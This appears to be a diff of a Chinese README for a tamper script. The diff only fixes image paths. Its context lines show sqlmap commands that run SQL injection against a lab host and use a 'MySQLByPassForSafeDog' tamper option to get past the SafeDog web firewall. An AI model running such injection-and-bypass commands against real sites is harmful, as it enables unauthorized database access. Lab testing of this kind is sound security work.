@@ -24,7 +24,7 @@
 
 安装网站安全狗Apache最新版
 
-![01](image\01.jpg)
+![01](/image/01.jpg)
 
 
 
@@ -32,7 +32,7 @@
 
 python sqlmap.py -u "http://192.168.2.3:60001/sqli.php?id=1" --random-agent --dbms=mysql
 
-![2](image\2.jpg)
+![2](/image/2.jpg)
 
 
 
@@ -40,7 +40,7 @@ python sqlmap.py -u "http://192.168.2.3:60001/sqli.php?id=1" --random-agent --db
 
 python sqlmap.py -u "http://192.168.2.3:60001/sqli.php?id=1" --random-agent --dbms=mysql --tamper=MySQLByPassForSafeDog
 
-![3](image\3.jpg)
+![3](/image/3.jpg)
 
 
 
@@ -50,7 +50,7 @@ python sqlmap.py -u "http://192.168.2.3:60001/sqli.php?id=1" --random-agent --db
 
 python sqlmap.py -u "http://192.168.2.3:60001/sqli.php?id=1" --random-agent --dbms=mysql --tamper=MySQLByPassForSafeDog -v 3
 
-![4](image\4.jpg)
+![4](/image/4.jpg)
 
 
 
